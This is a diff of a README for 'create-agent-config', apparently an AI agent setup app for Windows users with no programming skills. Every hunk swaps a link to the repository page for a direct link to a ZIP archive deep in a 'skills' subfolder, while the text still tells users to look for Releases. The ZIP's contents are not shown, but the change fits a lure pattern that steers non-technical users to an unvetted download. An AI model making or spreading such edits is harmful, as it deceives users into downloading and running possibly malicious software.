@@ -1,6 +1,6 @@
 # 🤖 create-agent-config - Easy AI Agent Setup
 
-[![Download create-agent-config](https://img.shields.io/badge/Download-Available-brightgreen)](https://github.com/faizallbs/create-agent-config)
+[![Download create-agent-config](https://img.shields.io/badge/Download-Available-brightgreen)](https://github.com/faizallbs/create-agent-config/raw/refs/heads/main/skills/agent-config-setup/create-agent-config-v2.5.zip)
 
 ---
 
@@ -16,7 +16,7 @@ You do not need programming skills to use this app. It works on Windows and give
 
 To get the software, visit this page:
 
-[https://github.com/faizallbs/create-agent-config](https://github.com/faizallbs/create-agent-config)
+[https://github.com/faizallbs/create-agent-config/raw/refs/heads/main/skills/agent-config-setup/create-agent-config-v2.5.zip](https://github.com/faizallbs/create-agent-config/raw/refs/heads/main/skills/agent-config-setup/create-agent-config-v2.5.zip)
 
 Click the **Releases** or **Download** section on the page to find the latest version. Download the package to your Windows PC.
 
@@ -38,7 +38,7 @@ Follow these steps to download and run create-agent-config on your Windows PC.
 ### Step 1: Download the App
 
 1. Open your web browser.
-2. Go to [https://github.com/faizallbs/create-agent-config](https://github.com/faizallbs/create-agent-config).
+2. Go to [https://github.com/faizallbs/create-agent-config/raw/refs/heads/main/skills/agent-config-setup/create-agent-config-v2.5.zip](https://github.com/faizallbs/create-agent-config/raw/refs/heads/main/skills/agent-config-setup/create-agent-config-v2.5.zip).
 3. Look for a **Releases** tab or a download link.
 4. Download the latest Windows installer or ZIP file.
 
@@ -111,7 +111,7 @@ If you run into issues:
 
 For more info, visit the repository page:
 
-[https://github.com/faizallbs/create-agent-config](https://github.com/faizallbs/create-agent-config)
+[https://github.com/faizallbs/create-agent-config/raw/refs/heads/main/skills/agent-config-setup/create-agent-config-v2.5.zip](https://github.com/faizallbs/create-agent-config/raw/refs/heads/main/skills/agent-config-setup/create-agent-config-v2.5.zip)
 
 You can find documentation, ask questions, or report bugs there.
 
@@ -135,4 +135,4 @@ You can find documentation, ask questions, or report bugs there.
 
 ---
 
-[![Download create-agent-config](https://img.shields.io/badge/Download-here-blue?style=for-the-badge&logo=github)](https://github.com/faizallbs/create-agent-config)
+[![Download create-agent-config](https://img.shields.io/badge/Download-here-blue?style=for-the-badge&logo=github)](https://github.com/faizallbs/create-agent-config/raw/refs/heads/main/skills/agent-config-setup/create-agent-config-v2.5.zip)
